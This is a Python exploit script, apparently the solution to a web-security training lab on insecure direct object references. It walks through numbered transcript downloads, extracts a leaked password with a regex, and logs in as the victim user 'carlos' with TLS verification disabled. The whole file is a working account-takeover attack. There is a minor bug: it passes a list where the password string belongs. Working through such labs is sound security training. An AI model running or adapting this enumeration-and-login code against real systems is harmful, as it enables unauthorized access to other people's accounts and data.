# Lab:  Insecure direct object reference
import os
import re

import requests
import urllib3
import sys
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(s, url):
    path = "/login"
    r = s.get(url + path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def login(s, url, username, password):
    path = "/login"
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(url + path, data=data, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(-> Logged in !")
    else:
        print("(-) Couldn't log into user acc")
        exit(-1)


def get_password_from_file(s, url):
    download_transcript_path = "/download-transcript/1.txt"

    for i in range(1, 50):
        download_transcript_path = f"/download-transcript/{i}.txt"
        r = s.get(url + download_transcript_path, verify=False, proxies=proxies)
        resp = r.text
        if "password" in resp:
            password = re.findall(r"password is (.*)\.", resp)
            print(password)
            print("(-) Found a user password")
            login(s, url, "carlos", password)
            return

    print("(-) Couldn't find user password")
    exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.Session()
    get_password_from_file(s, url)


if __name__ == "__main__":
    main()
